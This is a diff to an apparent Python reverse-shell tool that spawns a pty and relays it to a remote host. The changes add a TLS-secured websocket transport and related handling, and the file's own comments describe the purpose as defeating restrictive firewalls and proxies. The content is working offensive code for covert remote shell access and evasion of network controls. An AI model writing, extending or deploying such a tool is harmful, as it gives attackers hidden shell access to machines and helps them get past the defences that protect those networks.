@@ -7,7 +7,7 @@
 #
 # But with different transports, specifically websocket and secure websockets to defeat restrictive firewalls/proxies
 
-import argparse, base64, functools, hashlib, os, pty, select, ssl, socket, struct
+import argparse, base64, functools, hashlib, os, pty, select, ssl, socket, struct, time
 
 class FileDesc:
     def __init__(self, fd):
@@ -60,11 +60,31 @@ class TlsSocket(Socket):
         rv._origsocket = rv._socket
         rv._socket = context.wrap_socket(rv._socket, server_hostname=rv.host)
 
+        # Using tls sockets with select() isn't straightforward because select() works with raw sockets.
+        # Ie data may be available on the socket but that doesn't mean data will be available at the tls level.
+        # A simple workaround is to use non-blocking sockets and gracefully handle SSL_ERROR_WANT_READ (tls equiv of EWOULDBLOCK).
+
+        rv._socket.setblocking(False)
+
         return rv
 
     def __exit__(self):
         self._socket.close()
         self._origsocket.close()
+
+    def read(self, n=1024):
+        try:
+            rv = self._socket.recv(n)
+        except ssl.SSLError as e:
+            if e.errno == ssl.SSL_ERROR_WANT_READ:
+                return None
+            raise e
+
+        if self._socket.pending() > 0:
+            rv += self._socket.recv(self._socket.pending())
+
+        assert len(rv) > 0
+        return rv
 
 class WebSocket:
     def __init__(self, host, port):
@@ -72,24 +92,22 @@ class WebSocket:
         self.port = port
 
     def __enter__(self):
-        self.__socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        ip = socket.gethostbyname(self.host)
-        self.__socket.connect((ip, self.port))
+        self._socket_setup()
 
         key = base64.b64encode(os.urandom(16)).decode('utf-8')
 
-        self.__socket.sendall(( 'GET / HTTP/1.1\r\n' +
-                               f'Host: {self.host}\r\n' +
-                                'Upgrade: websocket\r\n' +
-                                'Connection: Upgrade\r\n' +
-                               f'Sec-WebSocket-Key: {key}\r\n' +
-                                'Sec-WebSocket-Protocol: chat\r\n' +
-                                'Sec-WebSocket-Version: 13\r\n' +
-                               f'Origin: https://{self.host}\r\n' +
-                                '\r\n'
-                              ).encode('utf-8'))
+        self._socket.sendall(( 'GET / HTTP/1.1\r\n' +
+                              f'Host: {self.host}\r\n' +
+                               'Upgrade: websocket\r\n' +
+                               'Connection: Upgrade\r\n' +
+                              f'Sec-WebSocket-Key: {key}\r\n' +
+                               'Sec-WebSocket-Protocol: chat\r\n' +
+                               'Sec-WebSocket-Version: 13\r\n' +
+                              f'Origin: https://{self.host}\r\n' +
+                               '\r\n'
+                             ).encode('utf-8'))
 
-        headers = self.__socket.recv(4096).decode('utf-8').splitlines()
+        headers = self._socket.recv(4096).decode('utf-8').splitlines()
 
         assert headers[0] == 'HTTP/1.1 101 Web Socket Protocol Handshake'
 
@@ -104,14 +122,19 @@ class WebSocket:
 
         return self
 
+    def _socket_setup(self):
+        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        ip = socket.gethostbyname(self.host)
+        self._socket.connect((ip, self.port))
+
     def __exit__(self, exctype, excval, traceback):
-        self.__socket.close()
+        self._socket.close()
 
     def fileno(self):
-        return self.__socket.fileno()
+        return self._socket.fileno()
 
     def read(self):
-        b1, b2 = struct.unpack('BB', self.__socket.recv(2))
+        b1, b2 = struct.unpack('BB', self._socket.recv(2))
         finbit = b1 & 0x80 == 0x80
         assert finbit
         opcode = b1 & 0x0f
@@ -123,11 +146,11 @@ class WebSocket:
         if payloadlen < 126:
             pass
         elif payloadlen == 126:
-            payloadlen = struct.unpack('>H', self.__socket.recv(2))[0]
+            payloadlen = struct.unpack('>H', self._socket.recv(2))[0]
         else: # payloadlen == 127:
-            payloadlen = struct.unpack('>Q', self.__socket.recv(2))[0]
+            payloadlen = struct.unpack('>Q', self._socket.recv(2))[0]
 
-        payload = self.__socket.recv(payloadlen, socket.MSG_WAITALL)
+        payload = self._socket.recv(payloadlen, socket.MSG_WAITALL)
         assert len(payload) == payloadlen
         return payload
 
@@ -148,9 +171,55 @@ class WebSocket:
             frame += bytes([b ^ key[i]])
             i = (i + 1) % 4
 
-        self.__socket.sendall(frame)
+        self._socket.sendall(frame)
 
-# FIXME Implement TlsWebSocket
+class TlsWebSocket(WebSocket):
+    def _socket_setup(self):
+        super()._socket_setup()
+
+        context = ssl.create_default_context()
+        context.load_verify_locations('server.crt') # For self-signed certs
+
+        self._origsocket = self._socket
+        self._socket = context.wrap_socket(self._socket, server_hostname=self.host)
+
+    def __exit__(self):
+        self._socket.close()
+        self._origsocket.close()
+
+    def read(self):
+        try:
+            buf = self._socket.recv(2)
+        except ssl.SSLError as e:
+            if e.errno == ssl.SSL_ERROR_WANT_READ:
+                assert len(buf) == 0
+                return None
+            raise e
+
+        # The remaining recv()s should not fail since the websocket frame header should have been received in full.
+        # Only the retrieving the payload may reasonably block (or raise SSL_ERROR_WANT_READ), which is handled by a loop below.
+
+        b1, b2 = struct.unpack('BB', buf)
+        finbit = b1 & 0x80 == 0x80
+        assert finbit
+        opcode = b1 & 0x0f
+        assert opcode == 2 # Binary frame
+        maskbit = b2 & 0x80 == 0x80
+        assert not maskbit
+        payloadlen = b2 & 0x7f
+
+        if payloadlen < 126:
+            pass
+        elif payloadlen == 126:
+            payloadlen = struct.unpack('>H', self._socket.recv(2))[0]
+        else: # payloadlen == 127:
+            payloadlen = struct.unpack('>Q', self._socket.recv(2))[0]
+
+        while self._socket.pending() < payloadlen:
+            time.sleep(0.1)
+        payload = self._socket.recv(payloadlen)
+
+        return payload
 
 # TODO Prototype novel transports, eg periodic http(s) requests for especially restrictive networks
 
@@ -163,6 +232,7 @@ if __name__ == '__main__':
     transport_type.add_argument('--socket', '-s', action='store_const', const='Socket')
     transport_type.add_argument('--tls-socket', '-t', action='store_const', const='TlsSocket')
     transport_type.add_argument('--websocket', '-w', action='store_const', const='WebSocket')
+    transport_type.add_argument('--tls-websocket', '-x', action='store_const', const='TlsWebSocket')
 
     args = parser.parse_args()
 
@@ -184,5 +254,7 @@ if __name__ == '__main__':
                     break
 
                 for r in rlist:
-                    w = server if r == childobj else childobj
-                    w.write(r.read())
+                    d = r.read()
+                    if d:
+                        w = server if r == childobj else childobj
+                        w.write(d)
